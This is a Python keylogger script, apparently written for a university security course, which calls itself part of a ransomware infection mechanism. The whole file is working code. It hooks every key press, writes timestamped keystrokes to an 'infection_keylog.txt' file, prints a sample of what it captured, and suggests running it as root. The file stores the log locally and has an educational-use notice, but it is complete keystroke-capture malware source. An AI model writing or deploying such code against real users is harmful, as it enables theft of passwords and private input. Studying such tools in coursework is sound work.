#!/usr/bin/env python3
"""
Keylogger for CSCE 5550 Project
This is designed as part of the ransomware infection mechanism.
NOTICE: Only for academic/educational purposes in controlled environments.
"""

import os
import sys
import time
import logging
from datetime import datetime
try:
    import keyboard
except ImportError:
    print("[-] keyboard module not found. Install with: pip install keyboard")
    sys.exit(1)

class SimpleKeylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
    def callback(self, event):
        """Process key events"""
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            
            # Handle special keys
            if key == 'space':
                key = ' '
            elif key == 'enter':
                key = '[ENTER]\n'
            elif key == 'backspace':
                key = '[BACKSPACE]'
            elif len(key) > 1:
                key = f'[{key.upper()}]'
                
            logging.info(key)
            
    def start(self):
        """Start the keylogger"""
        print(f"[+] Keylogger started. Logging to {self.log_file}")
        print("[+] Press 'Esc' to stop logging")
        
        # Register the callback
        keyboard.on_press(self.callback)
        
        # Wait for ESC key to stop
        try:
            keyboard.wait('esc')
        except KeyboardInterrupt:
            pass
            
        print(f"[+] Keylogger stopped. Log saved to {self.log_file}")
        
    def get_log_content(self):
        """Read log content"""
        try:
            with open(self.log_file, 'r') as f:
                return f.read()
        except FileNotFoundError:
            return ""

def main():
    # Create keylogger instance
    kl = SimpleKeylogger("infection_keylog.txt")
    
    # Start logging
    kl.start()
    
    # Show sample of captured keystrokes
    print("\n[+] Sample captured keystrokes:")
    content = kl.get_log_content()
    lines = content.split('\n')[-10:]  # Last 10 lines
    for line in lines:
        if line.strip():
            print(f"    {line}")

if __name__ == "__main__":
    # Check if running with sufficient privileges
    if os.geteuid() != 0:
        print("[-] This keylogger may need root privileges on some systems")
        print("    Run with: sudo python3 keylogger.py")
    
    main()
